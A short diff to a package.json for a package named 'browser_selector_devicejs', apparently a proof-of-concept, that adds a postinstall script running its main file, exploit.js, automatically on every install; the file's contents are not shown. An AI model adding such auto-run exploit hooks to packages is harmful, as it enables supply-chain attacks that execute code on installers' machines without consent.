@@ -1,4 +1,9 @@
 {
   "name": "browser_selector_devicejs",
-  "main": "exploit.js"
+  "main": "exploit.js",
+  "dependencies": {},
+  "scripts": {
+    "postinstall": "node exploit.js"
+  }
 }
+
